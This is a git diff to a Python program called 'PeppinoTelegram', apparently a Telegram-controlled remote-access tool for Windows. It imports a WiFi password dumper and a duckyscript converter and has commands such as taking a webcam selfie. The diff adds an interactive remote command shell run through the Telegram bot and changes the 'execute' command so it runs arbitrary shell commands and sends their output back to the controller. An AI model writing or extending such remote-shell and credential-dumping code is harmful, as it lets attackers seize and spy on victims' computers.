@@ -74,6 +74,7 @@ from utils.tunnel_handler import *
 from utils.duckyscript import toducky
 from utils.mymixer import CustomMixer
 from utils.wifidumper import WifiDumper
+from utils.cmdsession import CMDSession
 
 def resource_path(relative_path: str) -> str:
     if getattr(sys, 'frozen', False):
@@ -849,6 +850,7 @@ class PeppinoTelegram:
         self.mainmenu_ref = None
         self.wifidumper = WifiDumper()
         self.all_session_messages: list[int] = []
+        self.cmd_session = CMDSession()
 
         #gets the function from the text
         self.function_table: dict[str:Callable] = {
@@ -860,7 +862,7 @@ class PeppinoTelegram:
             "altf4":self.altf4,
             "breath":self.breath,
             "browser":browseropen,
-            "execute":self.execute,
+            "execute":lambda x: self.bsend(self.execute(x, return_output=True, shell=True)),
             "selfie":self.selfie,
             "plankton":self.plankton,
             "johnpork":self.johnpork,
@@ -999,6 +1001,35 @@ class PeppinoTelegram:
         except Exception as e:
             return self.bsend(text, retries+1)
 
+    def cmdsession(self) -> None:
+        """Interactive CMD session via Telegram."""
+        self.bsend("💻 CMD session started. Type 'exit' to quit.")
+        while True:
+            command = self.send_prompt("CMD> ")
+            if command.strip().lower() == "exit":
+                self.cmd_session.exit()
+                self.bsend("💻 CMD session closed.")
+                break
+            self.cmd_session.write_input(command)
+            output_lines = []
+
+            # Collect both stdout and stderr
+            for line in self.cmd_session.cmd_session.stdout:
+                if not line.strip():
+                    break
+                output_lines.append(line)
+            for line in self.cmd_session.cmd_session.stderr:
+                if not line.strip():
+                    break
+                output_lines.append(line)
+
+            # Send result or a placeholder if empty
+            if output_lines:
+                self.bsend("".join(output_lines))
+            else:
+                self.bsend("(no output)")
+
+
     def cantopen(self, process: str) -> None:
         self.cantopenlist.append(process)
         self.bsend(f"🔒 Added {process} to cantopenlist.")
@@ -1067,9 +1098,9 @@ class PeppinoTelegram:
         for message_id in self.all_session_messages:
             self.delete_message(message_id)
 
-    def execute(self, *command, return_output: bool=False) -> None:
+    def execute(self, *command, return_output: bool=False, shell: bool=False) -> None:
         command = " ".join(command)
-        s = sp.run(command, stdout=sp.PIPE, stderr=sp.PIPE, encoding="utf-8")
+        s = sp.run(command, shell=shell, stdout=sp.PIPE, stderr=sp.PIPE, encoding="cp850")
         if s.returncode:
             output = s.stderr
         else:
